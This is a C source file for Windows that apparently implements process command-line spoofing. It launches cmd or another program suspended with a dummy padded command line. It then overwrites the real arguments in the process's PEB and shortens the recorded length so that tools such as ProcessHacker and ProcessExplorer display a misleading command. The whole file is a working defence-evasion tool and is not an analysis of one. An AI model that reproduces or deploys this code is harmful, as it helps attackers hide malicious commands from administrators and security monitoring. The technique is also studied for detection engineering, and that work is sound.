#include <stddef.h>
#include <stdbool.h>
#include <windows.h>
#include <winternl.h>
#include <stdio.h>

typedef NTSTATUS (*NtQueryInformationProcess2)(IN HANDLE, IN PROCESSINFOCLASS,
                                               OUT PVOID, IN ULONG, OUT PULONG);

void *readProcessMemory(HANDLE process, void *address, DWORD bytes) {
  SIZE_T bytesRead;
  char *alloc;

  alloc = (char *)malloc(bytes);
  if (alloc == NULL) {
    return NULL;
  }

  if (ReadProcessMemory(process, address, alloc, bytes, &bytesRead) == 0) {
    free(alloc);
    return NULL;
  }

  return alloc;
}

BOOL writeProcessMemory(HANDLE process, void *address, void *data,
                        DWORD bytes) {
  SIZE_T bytesWritten;

  if (WriteProcessMemory(process, address, data, bytes, &bytesWritten) == 0) {
    return false;
  }

  return true;
}

int main(int argc, char **argv) {
	if (argc < 3)
	{
		printf("[*] Usage: %s [command] [argument]\n", argv[0]);
		system("pause");
		return 0;
	}

  STARTUPINFOA si = {0};
  PROCESS_INFORMATION pi = {0};
  PROCESS_BASIC_INFORMATION pbi;
  DWORD retLen;
  SIZE_T bytesRead;
  PEB pebLocal;
  RTL_USER_PROCESS_PARAMETERS *parameters;
    //char test[MAX_PATH];
	char* aaa=(char *)"cmd";

	char* bbb=(char *)"cmd.exe";

    int padding_size = 0;
    int memsize = 0;
	for (int i = 1; i < argc; i++)  {
    	padding_size += strlen(argv[i]);
	}
	//            padding 'x'           argv[1]+' '    '\0'
	memsize = (padding_size+5) + (strlen(argv[1])+1) + 1;
	char *addr = (char *)malloc(memsize);
	addr[memsize-1] = 0;
	memset(addr, 'x', memsize-1);

	if (strcmp(argv[1],aaa)==0 || strcmp(argv[1],bbb)==0)
	{
		strcpy(addr, argv[1]);
	}
	else{
		strcpy(addr, argv[1]);
	}
	memset(addr+strlen(argv[1]), ' ', 1);
    
	// addr -> argv[1] xxxxxxxxxxxxxxxxxx

	int command_size = 4; // len("/c ")+1
	for (int i = 1; i < argc; i++) {
		command_size += strlen(argv[i])+1;
	}
	char *command = (char *)malloc(command_size);
	memset(command, 0, command_size);
	
	char *next_addr = command;
    //char str[MAX_PATH];
	if (strcmp(argv[2], "/c") != 0 && (strcmp(argv[1],aaa)==0 || strcmp(argv[1],bbb)==0))
	{
		strcpy(command, argv[1]);
		strcpy(command+strlen(argv[1]), " /c ");
		next_addr += strlen(argv[1])+4;
	}
	else{
		strcpy(command, argv[1]);
		next_addr += strlen(argv[1]);
		memset(next_addr, ' ', 1);
		next_addr += 1;
	}
	
	for (int i = 2; i < argc; i++) {
		strcpy(next_addr, argv[i]);
		next_addr += strlen(argv[i]);
		memset(next_addr, ' ', 1);
		next_addr += 1;
	}
	// reset the last ' '
	memset(next_addr-1, 0, 1);
	
	// test -> addr
	// str -> command
	printf("padding: %s\ncommand: %s\n", addr, command);
	char *str = command;
	char *test = addr;
	//exit(0);
    int size = mbstowcs(0, str, 0) + 1;
    wchar_t *wstr = (wchar_t *)malloc(size * sizeof(wchar_t));
    mbstowcs(wstr, str, size);

  // Start process suspended
  CreateProcessA(NULL,
                 (LPSTR) test,
                 NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NEW_CONSOLE, NULL,
                 "C:\\Windows\\System32\\", &si, &pi);

  // Retrieve information on PEB location in process
  NtQueryInformationProcess2 ntpi = (NtQueryInformationProcess2)GetProcAddress(
      LoadLibraryA("ntdll.dll"), "NtQueryInformationProcess");
  ntpi(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);

  // Read the PEB from the target process
  ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, &pebLocal, sizeof(PEB),
                    &bytesRead);

  // Grab the ProcessParameters from PEB
  parameters = (RTL_USER_PROCESS_PARAMETERS *)readProcessMemory(
      pi.hProcess, pebLocal.ProcessParameters,
      sizeof(RTL_USER_PROCESS_PARAMETERS) + 300);

  // Set the actual arguments we are looking to use
  
  writeProcessMemory(pi.hProcess, parameters->CommandLine.Buffer,
                     (void *)wstr, size * sizeof(wchar_t));

  /////// Below we can see an example of truncated output in ProcessHacker and
  /// ProcessExplorer /////////

  // Update the CommandLine length (Remember, UNICODE length here)
  DWORD newUnicodeLen = 28;

  writeProcessMemory(
      pi.hProcess,
      (char *)pebLocal.ProcessParameters +
          offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length),
      (void *)&newUnicodeLen, 4);

  // Resume thread execution*/
  ResumeThread(pi.hThread);
}
